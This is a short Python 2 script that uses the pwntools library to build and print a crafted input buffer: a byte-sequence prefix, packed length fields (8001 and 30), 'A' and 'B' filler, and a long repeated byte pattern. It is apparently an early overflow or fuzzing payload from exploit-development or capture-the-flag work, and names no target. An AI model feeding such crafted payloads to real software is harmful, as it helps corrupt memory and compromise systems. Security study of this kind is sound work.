import os
from pwn import *
len_buf = 8001
buf = ''.join([chr(i) for i in range(24)])
buf += p32(len_buf)
buf += p32(30)
buf = buf+ 'A'*8 + 'B'*8 + "".join([chr(i) for i in range(250)])*100
# buf / "".join([chr(i) for i in range(250)])*100
print buf
